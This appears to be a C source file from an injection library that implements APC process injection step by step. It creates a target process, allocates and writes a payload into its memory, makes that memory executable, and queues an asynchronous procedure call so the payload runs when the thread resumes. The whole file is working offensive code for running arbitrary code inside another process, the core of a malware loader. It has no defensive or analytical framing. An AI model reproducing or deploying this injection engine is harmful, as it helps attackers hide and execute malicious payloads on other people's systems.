#include <sindri/common/status.h>
#include <sindri/injection/apc/engine.h>
#include <sindri/primitives/os_api.h>

snd_status_t snd_inj_apc_create_target(snd_inj_ctx_t *ctx) {
    if (!ctx || !ctx->proc_api || !ctx->proc_api->create_process)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    if (ctx->stage != SND_INJ_STAGE_UNINITIALIZED)
        return SND_ERR_CTX(SND_STATUS_INVALID_PARAMETER, "Context not uninitialized.");

    if (!ctx->target_image_path)
        return SND_ERR_CTX(SND_STATUS_INVALID_PARAMETER, "Target image path not set.");

    snd_status_t status =
        ctx->proc_api->create_process(ctx->target_image_path, NULL, &ctx->target_process, &ctx->remote_thread);
    if (SND_FAILED(status))
        return status;

    ctx->stage = SND_INJ_STAGE_TARGET_ACQUIRED;
    return SND_OK;
}

snd_status_t snd_inj_apc_alloc_remote(snd_inj_ctx_t *ctx) {
    if (!ctx || !ctx->proc_api || !ctx->proc_api->alloc_remote)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    if (ctx->stage != SND_INJ_STAGE_TARGET_ACQUIRED)
        return SND_ERR_CTX(SND_STATUS_INVALID_PARAMETER, "Target not acquired.");

    if (!ctx->payload || ctx->payload->size == 0)
        return SND_ERR_CTX(SND_STATUS_INVALID_PARAMETER, "Payload not provided.");

    snd_status_t status = ctx->proc_api->alloc_remote(ctx->target_process, ctx->payload->size,
                                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, &ctx->remote_base);
    if (SND_FAILED(status))
        return status;

    ctx->stage = SND_INJ_STAGE_MEMORY_ALLOCATED;
    return SND_OK;
}

snd_status_t snd_inj_apc_write_payload(snd_inj_ctx_t *ctx) {
    if (!ctx || !ctx->proc_api || !ctx->proc_api->write_remote)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    if (ctx->stage != SND_INJ_STAGE_MEMORY_ALLOCATED)
        return SND_ERR_CTX(SND_STATUS_INVALID_PARAMETER, "Remote memory not allocated.");

    SIZE_T       written = 0;
    snd_status_t status =
        ctx->proc_api->write_remote(ctx->target_process, ctx->remote_base, ctx->payload->data, ctx->payload->size, &written);
    if (SND_FAILED(status))
        return status;

    if (written != ctx->payload->size)
        return SND_ERR(SND_STATUS_VIRTUAL_WRITE_FAILED);

    ctx->stage = SND_INJ_STAGE_PAYLOAD_WRITTEN;
    return SND_OK;
}

snd_status_t snd_inj_apc_set_protections(snd_inj_ctx_t *ctx) {
    if (!ctx || !ctx->proc_api || !ctx->proc_api->protect_remote)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    if (ctx->stage != SND_INJ_STAGE_PAYLOAD_WRITTEN)
        return SND_ERR_CTX(SND_STATUS_INVALID_PARAMETER, "Payload not written.");

    DWORD        old    = 0;
    snd_status_t status = ctx->proc_api->protect_remote(ctx->target_process, ctx->remote_base, ctx->payload->size,
                                                        PAGE_EXECUTE_READ, &old);
    if (SND_FAILED(status))
        return status;

    ctx->stage = SND_INJ_STAGE_PROTECTIONS_SET;
    return SND_OK;
}

snd_status_t snd_inj_apc_execute(snd_inj_ctx_t *ctx) {
    if (!ctx || !ctx->thread_api || !ctx->thread_api->queue_apc || !ctx->thread_api->resume_thread)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    if (ctx->stage != SND_INJ_STAGE_PROTECTIONS_SET)
        return SND_ERR_CTX(SND_STATUS_INVALID_PARAMETER, "Protections not set.");

    PVOID entry_point = ctx->remote_entry_point ? ctx->remote_entry_point : ctx->remote_base;

    snd_status_t status = ctx->thread_api->queue_apc(ctx->remote_thread, entry_point, ctx->remote_arg);
    if (SND_FAILED(status))
        return status;

    status = ctx->thread_api->resume_thread(ctx->remote_thread);
    if (SND_FAILED(status))
        return status;

    ctx->stage = SND_INJ_STAGE_EXECUTED;
    return SND_OK;
}
